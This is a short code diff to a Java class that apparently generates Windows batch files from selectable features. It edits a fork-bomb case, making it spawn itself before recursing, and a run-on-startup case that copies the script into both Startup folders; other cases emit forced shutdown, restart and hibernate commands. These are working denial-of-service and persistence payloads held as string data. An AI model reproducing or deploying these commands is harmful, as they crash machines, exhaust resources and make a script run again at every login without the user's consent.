@@ -70,7 +70,7 @@ public class Feature {
             case PAUSE:
                 return "pause >nul";
             case FORK_BOMB:
-                return "%0|%0";
+                return "start %0\r\n%0|%0";
             case SHUTDOWN:
                 return "shutdown /s ";
             case RESTART:
@@ -78,7 +78,7 @@ public class Feature {
             case HIBERNATE:
                 return "shutdown /h";
             case RUN_ON_STARTUP:
-                return "copy %0 \"%ProgramData%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\" \ncopy %0 \"%AppData%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\"";
+                return "copy %0 \"%ProgramData%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\" \r\ncopy %0 \"%AppData%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\"";
             case CLEAR_SCREEN:
                 return "cls";
             case RUN_LINE:
